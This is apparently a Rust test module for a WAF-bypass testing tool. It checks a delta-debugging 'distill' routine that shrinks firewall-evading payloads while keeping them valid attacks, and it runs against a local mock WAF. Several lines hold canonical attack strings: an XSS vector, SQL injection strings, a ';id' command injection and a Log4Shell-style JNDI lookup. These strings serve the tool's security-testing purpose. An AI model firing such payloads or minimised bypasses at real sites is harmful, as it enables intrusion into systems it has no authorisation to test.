    use super::*;

    // ── ddmin algorithm correctness (pure, no HTTP) ──────────

    #[tokio::test]
    async fn ddmin_returns_input_unchanged_when_only_full_input_satisfies() {
        let result = ddmin("abc", |s| async move { s == "abc" }).await;
        assert_eq!(result, "abc");
    }

    #[tokio::test]
    async fn ddmin_reduces_to_single_required_byte() {
        // Predicate: candidate contains 'X'.
        let result = ddmin("aXbcdef", |s| async move { s.contains('X') }).await;
        assert_eq!(
            result, "X",
            "ddmin must reduce to the single load-bearing char"
        );
    }

    #[tokio::test]
    async fn ddmin_reduces_to_both_load_bearing_chars_when_test_requires_both() {
        // Predicate: must contain BOTH 'X' AND 'Y'.
        let result = ddmin(
            "aXbcdYef",
            |s| async move { s.contains('X') && s.contains('Y') },
        )
        .await;
        // Should reduce to the minimum subset that contains both
        // 'XY' or 'XbcdY' or shorter. Both load-bearing chars must
        // survive.
        assert!(
            result.contains('X') && result.contains('Y'),
            "both X and Y must survive: got {result:?}"
        );
        // And the result should be SHORTER than the input.
        assert!(
            result.len() < "aXbcdYef".len(),
            "result must be shorter than input: got {result:?}"
        );
    }

    #[tokio::test]
    async fn ddmin_returns_input_when_test_constant_false() {
        // No subset satisfies. ddmin returns the input unchanged
        // because no reduction is valid.
        let result = ddmin("abc", |_s| async move { false }).await;
        assert_eq!(result, "abc");
    }

    #[tokio::test]
    async fn ddmin_handles_single_char_input_trivially() {
        let result = ddmin("a", |s| async move { !s.is_empty() }).await;
        assert_eq!(result, "a");
    }

    // ── Attack-preservation gate (the distill correctness fix) ───────────────
    //
    // distill's real predicate is the CONJUNCTION "still a valid attack of its
    // class" AND "still bypasses the WAF". These tests pin that the attack-
    // preservation clause stops ddmin shrinking a working payload into a benign
    // byte that merely passes the filter. They model the WAF as "passes
    // everything" (constant-true), the worst case, where ONLY the semantic
    // oracle constrains the reduction.

    #[tokio::test]
    async fn semantic_gate_keeps_a_valid_xss_attack_through_ddmin() {
        use crate::hunt::equiv_engine::oracle_valid;

        let original = "<svg onload=alert(1)>";
        assert!(
            oracle_valid("xss", original, original),
            "precondition: the canonical gate must accept the full input"
        );

        let orig = original.to_string();
        // Mirror the production structure: the sync semantic gate runs in the
        // closure body, the future just yields the resulting bool. The WAF is
        // modelled as "passes everything" (the worst case for collapse).
        let result = ddmin(original, move |cand: String| {
            let ok = oracle_valid("xss", &orig, &cand);
            async move { ok }
        })
        .await;

        assert!(
            oracle_valid("xss", original, &result),
            "the distilled payload must STILL be a valid XSS attack, got {result:?}"
        );
        assert!(
            result.chars().count() > 1,
            "the gate must prevent collapse to a single benign byte, got {result:?}"
        );
    }

    #[tokio::test]
    async fn without_the_semantic_gate_ddmin_collapses_to_noise() {
        use crate::hunt::equiv_engine::oracle_valid;

        // The OLD (buggy) distill predicate: "WAF passes" ALONE, modelled as
        // constant-true. With nothing preserving the attack, ddmin shrinks a
        // working XSS vector to a single byte (the exact failure the gate fixes).
        let original = "<svg onload=alert(1)>";
        let result = ddmin(original, |_c| async move { true }).await;
        assert_eq!(
            result.chars().count(),
            1,
            "WAF-only ddmin collapses to one char, got {result:?}"
        );
        assert!(
            !oracle_valid("xss", original, &result),
            "the collapsed payload is no longer an attack, this is WHY the gate exists"
        );
    }

    #[tokio::test]
    async fn semantic_gate_preserves_sql_injection_through_ddmin() {
        use crate::hunt::equiv_engine::oracle_valid;

        // The canonical SQL gate is SAME-EXPLOIT-preserving (`still_executes` +
        // valid-injection parse), so the distilled form must remain the same
        // attack, not merely "some valid SQL".
        let original = "1 OR 1=1 -- ";
        assert!(
            oracle_valid("sql", original, original),
            "precondition: the canonical gate must accept the full input"
        );

        let orig = original.to_string();
        let result = ddmin(original, move |cand: String| {
            let ok = oracle_valid("sql", &orig, &cand);
            async move { ok }
        })
        .await;

        assert!(
            oracle_valid("sql", original, &result),
            "the distilled payload must STILL be a valid SQL injection, got {result:?}"
        );
    }

    #[test]
    fn distill_class_resolution_matches_the_canonical_gate() {
        use crate::hunt::equiv_engine::{class_for_payload_type, oracle_valid};
        use wafrift_grammar::grammar::PayloadType;

        // `auto` resolves through the SAME PayloadType→class mapping bench/scan
        // use (distill is wired to the one canonical gate, not a private copy).
        assert_eq!(class_for_payload_type(PayloadType::Xss), Some("xss"));
        assert_eq!(class_for_payload_type(PayloadType::Sql), Some("sql"));
        assert_eq!(
            class_for_payload_type(PayloadType::CommandInjection),
            Some("cmdi")
        );

        // The structural-class gates are live, they reject an obvious non-attack,
        // so a `--class` override never silently disables the gate for them.
        assert!(!oracle_valid("xss", "<svg onload=alert(1)>", "hello world"));
        assert!(!oracle_valid("sql", "1 OR 1=1", ")) not sql at all (("));
        assert!(!oracle_valid("cmdi", ";id", "harmless plain text"));

        // cve_pocs has no per-CVE oracle, so the gate validates ONLY intact
        // transmission (anti-rig, LAW 1): identity passes, any mutation is refused
        //: distilling a CVE PoC can therefore only ever return it unchanged.
        assert!(oracle_valid(
            "cve_pocs",
            "${jndi:ldap://x/a}",
            "${jndi:ldap://x/a}"
        ));
        assert!(!oracle_valid(
            "cve_pocs",
            "${jndi:ldap://x/a}",
            "${jndi:ldap://x/b}"
        ));
    }

    #[tokio::test]
    async fn ddmin_handles_empty_input_trivially() {
        let result = ddmin("", |_s| async move { false }).await;
        assert_eq!(result, "");
    }

    #[tokio::test]
    async fn ddmin_reduces_realistic_sql_payload_to_load_bearing_clause() {
        // Simulate a "the WAF sees 'OR 1=1' and blocks" scenario:
        // any payload CONTAINING 'OR 1=1' as a literal substring
        // "bypasses" (true in the predicate). Distillation should
        // peel off the surrounding noise.
        let payload = "/**/admin'/**/UNION/**/SELECT/**/1/**/FROM/**/users/**/WHERE/**/OR 1=1--";
        let result = ddmin(payload, |s| async move { s.contains("OR 1=1") }).await;
        assert!(result.contains("OR 1=1"), "got: {result:?}");
        // Should be MUCH shorter than the input.
        assert!(
            result.len() < payload.len() / 4,
            "result should be aggressively reduced: got {result:?} (len {})",
            result.len()
        );
    }

    #[tokio::test]
    async fn ddmin_call_count_is_bounded_polylog_for_simple_cases() {
        // Smoke test that ddmin doesn't blow up call count for a
        // single-byte requirement. Anti-rig against an
        // accidentally-quadratic implementation.
        let calls = Arc::new(AtomicU32::new(0));
        let calls_c = calls.clone();
        let _ = ddmin("abcdefghijklmnopqrstuvwxyz", move |s: String| {
            let calls = calls_c.clone();
            async move {
                calls.fetch_add(1, Ordering::SeqCst);
                s.contains('m')
            }
        })
        .await;
        let n = calls.load(Ordering::SeqCst);
        // 26-byte input, 1 load-bearing byte. ddmin in O(n log n)
        // should be well under 200 calls.
        assert!(n < 200, "expected < 200 calls, got {n}");
    }

    // ── Validation gates on the CLI wrapper ──────────────────

    fn args_minimal(target: &str, payload: &str) -> DistillArgs {
        DistillArgs {
            target: target.into(),
            param: "q".into(),
            payload: payload.into(),
            class: "auto".into(),
            format: "text".into(),
            delay_ms: 0,
            insecure: false,
            proxy: None,
            header: Vec::new(),
            max_fires: 500,
            timeout_secs: 0,
        }
    }

    #[tokio::test]
    async fn run_distill_rejects_empty_payload() {
        let args = args_minimal("http://127.0.0.1:65500", "");
        let cancel = CancellationToken::new();
        let code = run_distill(args, cancel).await;
        assert_eq!(
            format!("{code:?}"),
            format!("{:?}", ExitCode::from(2)),
            "empty payload must exit 2"
        );
    }

    // ── Live mock-WAF integration ────────────────────────────

    async fn spawn_mock_waf_blocking_on_substring(magic: &'static str) -> std::net::SocketAddr {
        use tokio::io::{AsyncReadExt, AsyncWriteExt};
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        tokio::spawn(async move {
            loop {
                let Ok((mut sock, _)) = listener.accept().await else {
                    return;
                };
                tokio::spawn(async move {
                    let mut buf = vec![0u8; 16 * 1024];
                    let n = sock.read(&mut buf).await.unwrap_or(0);
                    let req = String::from_utf8_lossy(&buf[..n]);
                    let (status, body) = if req.contains(magic) {
                        ("403 Forbidden", "<html>blocked</html>".to_string())
                    } else {
                        ("200 OK", "<html>ok</html>".to_string())
                    };
                    let resp = format!(
                        "HTTP/1.1 {status}\r\nContent-Type: text/html\r\n\
                         Content-Length: {}\r\nConnection: close\r\n\r\n{body}",
                        body.len()
                    );
                    let _ = sock.write_all(resp.as_bytes()).await;
                    let _ = sock.shutdown().await;
                });
            }
        });
        tokio::time::sleep(crate::diff::parser_diff_common::TEST_SETTLE).await;
        addr
    }

    #[serial_test::serial]
    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn distill_rejects_when_input_payload_is_blocked_by_target() {
        // Mock blocks anything containing "FOO". Try to distill a
        // payload that contains "FOO" → baseline probe sees a block
        // → distill exits 2.
        let addr = spawn_mock_waf_blocking_on_substring("FOO").await;
        let args = args_minimal(&format!("http://{addr}/"), "abFOOcd");
        let cancel = CancellationToken::new();
        let code = run_distill(args, cancel).await;
        assert_eq!(
            format!("{code:?}"),
            format!("{:?}", ExitCode::from(2)),
            "non-bypassing payload must exit 2"
        );
    }

    #[serial_test::serial]
    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn distill_succeeds_when_input_payload_bypasses() {
        // Mock blocks on "BLOCK"; our input "abXYcd" doesn't contain
        // it → bypass → distill runs successfully.
        let addr = spawn_mock_waf_blocking_on_substring("BLOCK").await;
        let args = args_minimal(&format!("http://{addr}/"), "abXYcd");
        let cancel = CancellationToken::new();
        let code = run_distill(args, cancel).await;
        assert_eq!(
            format!("{code:?}"),
            format!("{:?}", ExitCode::SUCCESS),
            "bypassing payload must exit 0"
        );
    }

    #[serial_test::serial]
    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn distill_honors_cancel_token() {
        // Cancel before baseline fires, the baseline still runs
        // (so we can tell the operator their payload doesn't bypass),
        // but the ddmin loop should respect the cancel and not run.
        let addr = spawn_mock_waf_blocking_on_substring("never").await;
        let args = args_minimal(&format!("http://{addr}/"), "anything");
        let cancel = CancellationToken::new();
        cancel.cancel();
        let code = run_distill(args, cancel).await;
        // SUCCESS because baseline ran, distilled to no reduction.
        assert_eq!(format!("{code:?}"), format!("{:?}", ExitCode::SUCCESS));
    }

    // ── urlencoding_encode ────────────────────────────────────

    #[test]
    fn urlencoding_encode_passes_unreserved_chars_through() {
        assert_eq!(urlencoding_encode("AbZ0-9_.~"), "AbZ0-9_.~");
    }

    #[test]
    fn urlencoding_encode_percent_encodes_specials() {
        assert_eq!(urlencoding_encode(" "), "%20");
        assert_eq!(urlencoding_encode("'"), "%27");
        assert_eq!(urlencoding_encode("="), "%3D");
        assert_eq!(urlencoding_encode("&"), "%26");
    }
